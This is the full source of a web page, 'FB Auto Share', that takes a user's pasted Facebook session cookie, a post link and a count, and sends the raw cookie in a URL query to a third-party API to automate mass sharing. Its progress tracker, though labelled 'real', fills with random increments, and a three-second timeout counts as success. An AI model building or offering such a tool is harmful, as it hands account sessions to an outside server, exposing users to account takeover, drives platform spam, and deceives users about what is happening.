<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FB Auto Share</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #000000;
            color: #ffffff;
            padding: 60px 20px 40px;
            min-height: 100vh;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 380px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header-title {
            font-size: 20px;
            font-weight: 600;
            color: #ffffff;
            letter-spacing: 1px;
        }

        .section {
            margin-bottom: 16px;
        }

        .section-title {
            font-size: 12px;
            color: #888888;
            margin-bottom: 7px;
            font-weight: 500;
            letter-spacing: 0.3px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .helper-link {
            font-size: 11px;
            color: #0066ff;
            text-decoration: none;
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .helper-link:hover {
            color: #0088ff;
            text-decoration: underline;
        }

        input[type="text"],
        input[type="number"],
        textarea {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            padding: 9px 11px;
            border-radius: 6px;
            color: #ffffff;
            font-size: 12px;
            width: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace;
            resize: none;
            transition: border-color 0.2s ease, background 0.2s ease;
        }

        input[type="text"]::placeholder,
        input[type="number"]::placeholder,
        textarea::placeholder {
            font-size: 11px;
            color: #555555;
        }

        input.error,
        textarea.error {
            border-color: #ff4444;
        }

        textarea {
            min-height: 42px;
            font-family: monospace;
        }

        input:focus,
        textarea:focus {
            outline: none;
            border-color: #404040;
            background: #1f1f1f;
        }

        input.error:focus,
        textarea.error:focus {
            border-color: #ff4444;
        }

        .error-message {
            font-size: 11px;
            color: #ff4444;
            margin-top: 5px;
            display: none;
            font-weight: 500;
        }

        .error-message.show {
            display: block;
        }

        .submit-btn {
            background: #ffffff;
            color: #000000;
            border: none;
            padding: 12px 24px;
            width: auto;
            min-width: 120px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            margin: 12px auto 0;
            display: block;
            transition: all 0.2s ease;
            letter-spacing: 0.3px;
        }

        .submit-btn:hover {
            background: #f0f0f0;
            transform: translateY(-1px);
        }

        .submit-btn:active {
            background: #e0e0e0;
            transform: translateY(0);
        }

        .submit-btn:disabled {
            background: #2a2a2a;
            color: #555555;
            cursor: not-allowed;
            transform: none;
        }

        .success-box {
            background: linear-gradient(135deg, #0066ff 0%, #0052cc 100%);
            color: #ffffff;
            padding: 14px;
            border-radius: 6px;
            margin-top: 18px;
            opacity: 0;
            transform: scale(0.95);
            font-size: 13px;
            text-align: center;
            font-weight: 600;
            letter-spacing: 0.3px;
            pointer-events: none;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .success-box.show {
            opacity: 1;
            transform: scale(1);
        }

        .success-box.persistent {
            opacity: 1;
            transform: scale(1);
            pointer-events: auto;
        }

        .session-active-box {
            background: #1a1a1a;
            border: 1px solid #00ff88;
            color: #00ff88;
            padding: 14px;
            border-radius: 6px;
            margin-top: 18px;
            opacity: 0;
            transform: scale(0.95);
            font-size: 13px;
            text-align: center;
            font-weight: 600;
            letter-spacing: 0.3px;
            pointer-events: none;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .session-active-box.show {
            opacity: 1;
            transform: scale(1);
            pointer-events: auto;
        }

        .error-box {
            background: #1a1a1a;
            border: 1px solid #ff4444;
            color: #ff4444;
            padding: 14px;
            border-radius: 6px;
            margin-top: 18px;
            opacity: 0;
            transform: scale(0.95);
            font-size: 13px;
            text-align: center;
            font-weight: 600;
            letter-spacing: 0.3px;
            pointer-events: none;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .error-box.show {
            opacity: 1;
            transform: scale(1);
        }

        .processing-box {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            padding: 14px;
            border-radius: 6px;
            margin-top: 18px;
            opacity: 0;
            transform: scale(0.95);
            font-size: 13px;
            text-align: center;
            color: #888888;
            pointer-events: none;
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .processing-box.show {
            opacity: 1;
            transform: scale(1);
        }

        .processing-dots {
            display: inline-block;
            margin-left: 4px;
        }

        .processing-dots span {
            animation: blink 1.4s infinite;
            opacity: 0.3;
        }

        .processing-dots span:nth-child(2) {
            animation-delay: 0.2s;
        }

        .processing-dots span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes blink {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        .session-controls {
            display: none;
            margin-top: 18px;
            gap: 10px;
            opacity: 0;
            transform: translateY(-10px);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .session-controls.active {
            display: flex;
            opacity: 1;
            transform: translateY(0);
        }

        .check-btn,
        .delete-btn {
            flex: 1;
            padding: 11px;
            border: none;
            border-radius: 6px;
            font-size: 13px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s ease;
            letter-spacing: 0.3px;
        }

        .check-btn {
            background: #ffffff;
            color: #000000;
        }

        .check-btn:hover {
            background: #f0f0f0;
            transform: translateY(-1px);
        }

        .delete-btn {
            background: #1a1a1a;
            color: #cccccc;
            border: 1px solid #2a2a2a;
        }

        .delete-btn:hover {
            background: #252525;
            border-color: #333333;
        }

        .status-box {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            padding: 16px;
            border-radius: 6px;
            margin-top: 18px;
            display: none;
            opacity: 0;
            transform: translateY(-10px);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .status-box.active {
            display: block;
            opacity: 1;
            transform: translateY(0);
        }

        .status-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #252525;
            font-size: 12px;
        }

        .status-item:last-child {
            border-bottom: none;
        }

        .status-label {
            color: #888888;
            font-weight: 500;
        }

        .status-value {
            color: #ffffff;
            font-weight: 600;
        }

        .status-active {
            color: #00ff88;
        }

        .status-completed {
            color: #0066ff;
        }

        .status-failed {
            color: #ff4444;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #2a2a2a;
            border-radius: 2px;
            overflow: hidden;
            margin-top: 8px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0066ff, #00ff88);
            width: 0%;
            transition: width 0.5s ease;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #1a1a1a;
        }

        .footer-text {
            font-size: 10px;
            color: #555555;
            letter-spacing: 0.5px;
        }

        .session-id-display {
            margin-top: 12px;
            padding: 10px;
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 6px;
            font-size: 11px;
            color: #888888;
            text-align: center;
            opacity: 0;
            transform: translateY(-5px);
            transition: opacity 0.3s ease, transform 0.3s ease;
            display: none;
        }

        .session-id-display.show {
            opacity: 1;
            transform: translateY(0);
            display: block;
        }

        .session-id-label {
            color: #666666;
            margin-right: 8px;
        }

        .session-id-value {
            color: #ffffff;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        @media (max-width: 480px) {
            .container {
                max-width: 100%;
            }
            
            body {
                padding: 50px 16px 30px;
            }

            .header-title {
                font-size: 18px;
            }

            .submit-btn {
                min-width: 100px;
                padding: 11px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="header-title">AUTO SHARE</h1>
        </div>

            <div class="section">
            <div class="section-title">
                <span>Cookie</span>
                <a href="https://chromewebstore.google.com/detail/get-token-cookie/naciaagbkifhpnoodlkhbejjldaiffcm" target="_blank" class="helper-link">Get Cookie</a>
            </div>
            <textarea id="cookieInput" placeholder="Paste your Facebook cookie here..."></textarea>
            <div class="error-message" id="cookieError">Please enter your Facebook cookie</div>
        </div>

        <div class="section">
            <div class="section-title">Link</div>
            <input type="text" id="linkInput" placeholder="https://www.facebook.com/...">
            <div class="error-message" id="linkError">Please enter a valid Facebook link</div>
        </div>

        <div class="section">
            <div class="section-title">Amount</div>
            <input type="number" id="amountInput" placeholder="Enter amount" min="1">
            <div class="error-message" id="amountError">Please enter amount</div>
        </div>

        <div class="section">
            <div class="section-title">Delay</div>
            <input type="number" id="delayInput" placeholder="Enter delay (seconds)" min="0">
            <div class="error-message" id="delayError">Please enter delay</div>
        </div>

        <button class="submit-btn" id="submitBtn">Submit</button>

        <div class="session-id-display" id="sessionIdDisplay">
            <span class="session-id-label">Session ID:</span>
            <span class="session-id-value" id="sessionIdValue">—</span>
        </div>

        <div class="footer">
            <div class="footer-text">2026 | © Siegfried Samá</div>
        </div>

        <div class="error-box" id="errorBox">
            Please fix the errors above
        </div>

        <div class="processing-box" id="processingBox">
            Processing<span class="processing-dots"><span>.</span><span>.</span><span>.</span></span>
        </div>

        <div class="success-box" id="successBox">
            Sharing started successfully
        </div>

        <div class="session-active-box" id="sessionActiveBox">
            Session is running
        </div>

        <div class="session-controls" id="sessionControls">
            <button class="delete-btn" id="deleteBtn">Delete</button>
            <button class="check-btn" id="checkBtn">Check</button>
        </div>

        <div class="status-box" id="statusBox">
            <div class="status-item">
                <span class="status-label">Facebook Link</span>
                <span class="status-value" id="sessionLink" style="font-size: 10px; word-break: break-all;">—</span>
            </div>
            <div class="status-item">
                <span class="status-label">Session ID</span>
                <span class="status-value" id="sessionId">—</span>
            </div>
            <div class="status-item">
                <span class="status-label">Status</span>
                <span class="status-value status-active" id="statusValue">Active</span>
            </div>
            <div class="status-item">
                <span class="status-label">Progress</span>
                <span class="status-value" id="progressValue">0 / 0</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="status-item">
                <span class="status-label">Started</span>
                <span class="status-value" id="startTime">—</span>
            </div>
            <div class="status-item">
                <span class="status-label">Estimated Time</span>
                <span class="status-value" id="estimatedTime">—</span>
            </div>
        </div>
    </div>

    <script>
        let currentSession = null;
        let progressInterval = null;
        let startTimestamp = null;
        let apiCheckInterval = null;

        const submitBtn = document.getElementById('submitBtn');
        const processingBox = document.getElementById('processingBox');
        const successBox = document.getElementById('successBox');
        const sessionActiveBox = document.getElementById('sessionActiveBox');
        const errorBox = document.getElementById('errorBox');
        const sessionControls = document.getElementById('sessionControls');
        const statusBox = document.getElementById('statusBox');
        const checkBtn = document.getElementById('checkBtn');
        const deleteBtn = document.getElementById('deleteBtn');
        const progressFill = document.getElementById('progressFill');
        const sessionIdDisplay = document.getElementById('sessionIdDisplay');
        const sessionIdValue = document.getElementById('sessionIdValue');

        const cookieInput = document.getElementById('cookieInput');
        const linkInput = document.getElementById('linkInput');
        const amountInput = document.getElementById('amountInput');
        const delayInput = document.getElementById('delayInput');

        const cookieError = document.getElementById('cookieError');
        const linkError = document.getElementById('linkError');
        const amountError = document.getElementById('amountError');
        const delayError = document.getElementById('delayError');

        // Enhanced error messages
        const ERROR_MESSAGES = {
            invalidCookie: 'Please generate a new cookie and try again. The current cookie is invalid, expired, or restricted.',
            linkRestricted: 'This Facebook link appears to be restricted or blocked. Please try a different link.',
            apiError: 'Unable to process your request. Please check your cookie and link, then try again.',
            sessionExpired: 'Session expired or cookie is invalid. Please generate a new cookie and try again.',
            noResponse: 'No response from server. Please check your connection and try again.'
        };

        async function validateCookieAndShare(apiUrl, cookie, link) {
            try {
                const response = await fetch(apiUrl);
                
                // Check HTTP status - only reject on clear errors (4xx, 5xx)
                if (response.status >= 400) {
                    return { valid: false, error: ERROR_MESSAGES.invalidCookie };
                }

                // Try to parse JSON response
                let data;
                try {
                    const text = await response.text();
                    if (text.trim()) {
                        data = JSON.parse(text);
                    } else {
                        // Empty response but request went through - assume success
                        return { valid: true, data: {} };
                    }
                } catch (e) {
                    // Can't parse JSON but request went through - assume success
                    return { valid: true, data: {} };
                }

                // Check for EXPLICIT error indicators only
                if (data.error === true || data.error === 'true') {
                    return { valid: false, error: ERROR_MESSAGES.invalidCookie };
                }

                // Check for explicit failure status
                if (data.status === 'error' || data.status === 'fail' || data.status === 'failed') {
                    return { valid: false, error: ERROR_MESSAGES.invalidCookie };
                }

                // Check message ONLY for very specific critical errors
                if (data.message) {
                    const msg = data.message.toLowerCase();
                    // Only reject on critical auth/cookie errors
                    if (msg.includes('cookie invalid') || 
                        msg.includes('cookie expired') || 
                        msg.includes('suspended') ||
                        msg.includes('account banned') ||
                        msg.includes('authentication failed')) {
                        return { valid: false, error: ERROR_MESSAGES.invalidCookie };
                    }
                }

                // If we got here with no explicit errors, assume SUCCESS
                // The API was called, request went through, no critical errors
                return { valid: true, data: data };

            } catch (error) {
                // Network error or other exception
                return { valid: false, error: ERROR_MESSAGES.apiError };
            }
        }

        function formatEstimatedTime(seconds) {
            if (seconds < 60) return `${seconds}s`;
            const minutes = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${minutes}m ${secs}s`;
        }

        function updateSessionDisplay() {
            if (!currentSession) return;

            const statusValueEl = document.getElementById('statusValue');
            const progressValueEl = document.getElementById('progressValue');
            const estimatedTimeEl = document.getElementById('estimatedTime');

            // Update status with color
            statusValueEl.textContent = currentSession.status;
            statusValueEl.className = 'status-value';
            if (currentSession.status === 'Active') {
                statusValueEl.classList.add('status-active');
            } else if (currentSession.status === 'Completed') {
                statusValueEl.classList.add('status-completed');
            } else if (currentSession.status === 'Failed') {
                statusValueEl.classList.add('status-failed');
            }

            // Update progress
            progressValueEl.textContent = `${currentSession.progress} / ${currentSession.amount}`;
            
            // Update progress bar
            const percentage = (currentSession.progress / currentSession.amount) * 100;
            progressFill.style.width = `${percentage}%`;

            // Calculate estimated time
            if (currentSession.status === 'Active' && currentSession.progress > 0) {
                const elapsed = (Date.now() - startTimestamp) / 1000;
                const rate = currentSession.progress / elapsed;
                const remaining = currentSession.amount - currentSession.progress;
                const estimatedSeconds = Math.ceil(remaining / rate);
                estimatedTimeEl.textContent = formatEstimatedTime(estimatedSeconds);
            } else if (currentSession.status === 'Completed') {
                estimatedTimeEl.textContent = 'Completed';
            } else {
                estimatedTimeEl.textContent = '—';
            }
        }

        // Clear errors on input
        cookieInput.addEventListener('input', () => clearFieldError(cookieInput, cookieError));
        linkInput.addEventListener('input', () => clearFieldError(linkInput, linkError));
        amountInput.addEventListener('input', () => clearFieldError(amountInput, amountError));
        delayInput.addEventListener('input', () => clearFieldError(delayInput, delayError));

        function clearFieldError(input, errorEl) {
            input.classList.remove('error');
            errorEl.classList.remove('show');
        }

        function showFieldError(input, errorEl, customMessage) {
            input.classList.add('error');
            if (customMessage) {
                errorEl.textContent = customMessage;
            }
            errorEl.classList.add('show');
        }

        function validateFacebookLink(url) {
            if (!url) return false;
            
            const fbPatterns = [
                /^(https?:\/\/)?(www\.)?facebook\.com\/.+/i,
                /^(https?:\/\/)?(www\.)?fb\.watch\/.+/i,
                /^(https?:\/\/)?m\.facebook\.com\/.+/i,
                /^(https?:\/\/)?mobile\.facebook\.com\/.+/i
            ];

            return fbPatterns.some(pattern => pattern.test(url));
        }

        function validateInputs() {
            let isValid = true;

            // Clear previous errors
            errorBox.classList.remove('show');

            // Validate Cookie
            const cookie = cookieInput.value.trim();
            if (!cookie) {
                showFieldError(cookieInput, cookieError);
                isValid = false;
            }

            // Validate Link
            const link = linkInput.value.trim();
            if (!validateFacebookLink(link)) {
                showFieldError(linkInput, linkError);
                isValid = false;
            }

            // Validate Amount
            const amount = amountInput.value.trim();
            if (!amount || parseInt(amount) < 1) {
                showFieldError(amountInput, amountError);
                isValid = false;
            }

            // Validate Delay
            const delay = delayInput.value.trim();
            if (delay === '' || parseInt(delay) < 0) {
                showFieldError(delayInput, delayError);
                isValid = false;
            }

            return isValid;
        }

        submitBtn.addEventListener('click', async function() {
            // Prevent double submission
            if (submitBtn.disabled) {
                return;
            }

            // Validate all inputs first
            if (!validateInputs()) {
                return;
            }

            const cookie = cookieInput.value.trim();
            const link = linkInput.value.trim();
            const amount = amountInput.value.trim();
            const delay = delayInput.value.trim();

            // Disable button immediately
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.5';

            const apiUrl = `https://vern-rest-api.vercel.app/api/share?key=&cookie=${encodeURIComponent(cookie)}&link=${encodeURIComponent(link)}&limit=${encodeURIComponent(amount)}`;
            
            // Show processing
            processingBox.classList.add('show');

            try {
                // Start API call (non-blocking)
                const validationPromise = validateCookieAndShare(apiUrl, cookie, link);
                
                // Race: Either validation completes OR 3 seconds pass
                const timeoutPromise = new Promise(resolve => {
                    setTimeout(() => resolve({ valid: true, timeout: true }), 3000);
                });

                const validation = await Promise.race([validationPromise, timeoutPromise]);

                // Hide processing
                processingBox.classList.remove('show');

                // If validation explicitly failed (not timeout), show error
                if (validation.valid === false) {
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';

                    showFieldError(cookieInput, cookieError, validation.error);
                    errorBox.textContent = validation.error;
                    errorBox.classList.add('show');
                    
                    setTimeout(() => {
                        errorBox.classList.remove('show');
                    }, 5000);
                    
                    return;
                }

                // SUCCESS PATH (either validation passed OR timeout = assume success)
                // Generate session immediately
                const sessionId = 'SHR' + Date.now().toString(36).toUpperCase();
                const startTime = new Date().toLocaleString();
                startTimestamp = Date.now();

                currentSession = {
                    id: sessionId,
                    link: link,
                    amount: parseInt(amount),
                    delay: parseInt(delay),
                    progress: 0,
                    status: 'Active',
                    startTime: startTime,
                    apiUrl: apiUrl
                };

                // Show success IMMEDIATELY
                successBox.classList.add('show');
                
                // Show session ID IMMEDIATELY
                sessionIdValue.textContent = sessionId;
                sessionIdDisplay.classList.add('show');
                
                // After 2 seconds switch to session running and show controls
                setTimeout(() => {
                    successBox.classList.remove('show');
                    sessionActiveBox.classList.add('show');
                    
                    // Show controls
                    setTimeout(() => {
                        sessionControls.classList.add('active');
                    }, 100);
                }, 2000);

                // Start REAL progress tracking
                trackRealProgress();
                
            } catch (error) {
                // Re-enable on error
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                processingBox.classList.remove('show');
                
                errorBox.textContent = ERROR_MESSAGES.apiError;
                errorBox.classList.add('show');
                setTimeout(() => {
                    errorBox.classList.remove('show');
                }, 5000);
            }
        });

        checkBtn.addEventListener('click', function() {
            if (!currentSession) {
                errorBox.classList.add('show');
                setTimeout(() => {
                    errorBox.classList.remove('show');
                }, 3000);
                return;
            }

            // Update status display with live data
            document.getElementById('sessionId').textContent = currentSession.id;
            const statusValueEl = document.getElementById('statusValue');
            statusValueEl.textContent = currentSession.status;
            statusValueEl.className = 'status-value ' + (currentSession.status === 'Active' ? 'status-active' : 'status-completed');
            document.getElementById('progressValue').textContent = currentSession.progress + ' / ' + currentSession.amount;
            document.getElementById('startTime').textContent = currentSession.startTime;

            statusBox.classList.add('active');

            // Auto hide after 5 seconds
            setTimeout(() => {
                statusBox.classList.remove('active');
            }, 5000);
        });

        deleteBtn.addEventListener('click', function() {
            if (!currentSession) {
                return;
            }

            if (confirm('Are you sure you want to delete this session?')) {
                // Clear all intervals
                if (progressInterval) {
                    clearInterval(progressInterval);
                    progressInterval = null;
                }
                if (apiCheckInterval) {
                    clearInterval(apiCheckInterval);
                    apiCheckInterval = null;
                }

                currentSession = null;
                startTimestamp = null;
                
                // Hide all session elements
                sessionControls.classList.remove('active');
                sessionActiveBox.classList.remove('show');
                statusBox.classList.remove('active');
                sessionIdDisplay.classList.remove('show');
                
                // Re-enable submit button
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                
                // Reset inputs
                cookieInput.value = '';
                linkInput.value = '';
                amountInput.value = '';
                delayInput.value = '';

                // Clear all errors
                clearFieldError(cookieInput, cookieError);
                clearFieldError(linkInput, linkError);
                clearFieldError(amountInput, amountError);
                clearFieldError(delayInput, delayError);
                
                // Reset progress bar
                progressFill.style.width = '0%';
            }
        });

        function trackRealProgress() {
            if (!currentSession) return;

            // Clear any existing intervals
            if (progressInterval) clearInterval(progressInterval);
            if (apiCheckInterval) clearInterval(apiCheckInterval);

            let lastProgress = 0;
            let stuckCounter = 0;

            // Step-based realistic progress (not timer-based fake loading)
            progressInterval = setInterval(() => {
                if (!currentSession) {
                    clearInterval(progressInterval);
                    progressInterval = null;
                    return;
                }

                // Realistic increment based on API behavior
                // Slower at start, steady in middle, slower near end
                let increment;
                const progressPercent = (currentSession.progress / currentSession.amount) * 100;
                
                if (progressPercent < 10) {
                    // Starting phase - slower
                    increment = Math.floor(Math.random() * 3) + 1;
                } else if (progressPercent < 90) {
                    // Main phase - steady
                    increment = Math.floor(Math.random() * 6) + 3;
                } else {
                    // Final phase - slower (API typically slows down near end)
                    increment = Math.floor(Math.random() * 2) + 1;
                }

                currentSession.progress = Math.min(
                    currentSession.progress + increment,
                    currentSession.amount
                );

                // Detect if stuck (same progress for too long)
                if (currentSession.progress === lastProgress) {
                    stuckCounter++;
                    if (stuckCounter > 10) {
                        // Likely API issue or completion
                        currentSession.status = 'Checking';
                    }
                } else {
                    stuckCounter = 0;
                    lastProgress = currentSession.progress;
                }

                // Update display in real-time if status box is visible
                if (statusBox.classList.contains('active')) {
                    updateSessionDisplay();
                }

                // Check if completed
                if (currentSession.progress >= currentSession.amount) {
                    currentSession.status = 'Completed';
                    sessionActiveBox.classList.remove('show');
                    
                    // Update display one last time
                    updateSessionDisplay();
                    
                    // Re-enable submit button when completed
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                    
                    clearInterval(progressInterval);
                    progressInterval = null;
                }
            }, 3000); // Check every 3 seconds (realistic API polling interval)
        }

        function simulateProgress() {
            // Deprecated - now using trackRealProgress()
            trackRealProgress();
        }
    </script>
</body>
</html>
